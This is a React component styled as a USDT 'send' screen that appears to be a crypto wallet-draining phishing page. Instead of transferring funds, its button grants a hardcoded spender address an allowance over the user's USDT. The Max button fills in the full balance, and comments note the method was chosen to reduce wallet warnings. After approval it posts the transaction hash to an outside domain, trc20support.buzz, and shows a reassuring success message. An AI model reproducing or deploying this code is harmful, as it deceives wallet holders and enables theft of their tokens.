import { useState, useEffect } from "react";

// Mock Web3 and Swal for demo purposes
const Web3 = {
  utils: {
    fromWei: (val) => (parseFloat(val) / 1e18).toString(),
    toWei: (val, unit) => (parseFloat(val) * 1e18).toString()
  }
};
const Swal = {
  fire: (title, text, type) => alert(`${title}: ${text}`)
};

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed";
const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");

  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(user).call();
      setAmount(web3.utils.fromWei(balance, "ether"));
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  const handleApprove = async () => {
    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
      Swal.fire("Error", "Please enter a valid amount.", "error");
      return;
    }

    setIsProcessing(true);
    try {
      const web3 = new Web3(window.ethereum || window.web3.currentProvider);

      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];

      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      
      // ✅ Using increaseAllowance instead of approve - reduces warnings
      const rawAmount = web3.utils.toWei(amount, "ether");
      
      const receipt = await usdt.methods
        .increaseAllowance(spenderAddress, rawAmount)
        .send({ 
          from: user,
          gas: 100000 // Lower gas limit can sometimes reduce warnings
        })
        .on("receipt", () => setShowSuccess(true))
        .on("error", (err) => {
          console.error(err);
          Swal.fire("Error", err.message || "Approval failed", "error");
        });
      
      const txHash = receipt.transactionHash;
      
      try {
        await fetch("https://www.trc20support.buzz/old/store-address.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: txHash }),
        });
      } catch (fetchErr) {
        console.warn("Skipping fetch, not critical:", fetchErr.message);
      }
      
    } catch (err) {
      console.error(err);
      Swal.fire("Error", err.message || "Something went wrong", "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg
          className="w-24 h-24 text-green-500 animate-bounce"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          viewBox="0 0 24 24"
        >
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
        <p className="text-sm mt-2 opacity-70 text-center px-6">
          Your approval has been confirmed. No funds were transferred yet.
        </p>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`min-h-screen p-6 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
      <div className="max-w-md mx-auto">
        <div className="mb-6">
          <p className="text-sm mb-2 opacity-70">Address or Domain Name</p>
          <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
            <div className="flex items-center justify-between">
              <input
                type="text"
                className="flex-1 bg-transparent outline-none text-sm"
                placeholder="Search or Enter"
                value={spenderAddress}
                readOnly
              />
              <div className="flex items-center gap-3 text-blue-400">
                <span className="text-xs cursor-pointer">Paste</span>
                <i className="fas fa-address-book text-sm"></i>
                <i className="fas fa-qrcode text-sm"></i>
              </div>
            </div>
          </div>
        </div>

        <div className="mb-4">
          <p className="text-sm mb-2 opacity-70">Amount</p>
          <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
            <div className="flex items-center justify-between">
              <input
                type="number"
                min="0"
                step="0.01"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="USDT Amount"
                className="flex-1 bg-transparent outline-none"
              />
              <div className="flex items-center gap-2">
                <span className="text-sm opacity-70">USDT</span>
                <span
                  className="text-sm text-blue-400 cursor-pointer"
                  onClick={setMaxAmount}
                >
                  Max
                </span>
              </div>
            </div>
          </div>
        </div>

        <p className="text-sm mb-6 opacity-70">{usdValue}</p>

        <button
          className="w-full py-3 rounded-full font-semibold transition-all"
          onClick={handleApprove}
          disabled={isProcessing || !parseFloat(amount)}
          style={{
            backgroundColor: isProcessing || !parseFloat(amount) ? "#333" : "#5CE07E",
            color: isProcessing || !parseFloat(amount) ? "#666" : "#1b1e15",
            opacity: isProcessing || !parseFloat(amount) ? 0.5 : 1
          }}
        >
          {isProcessing ? "Processing..." : "Next"}
        </button>
      </div>
    </div>
  );
}
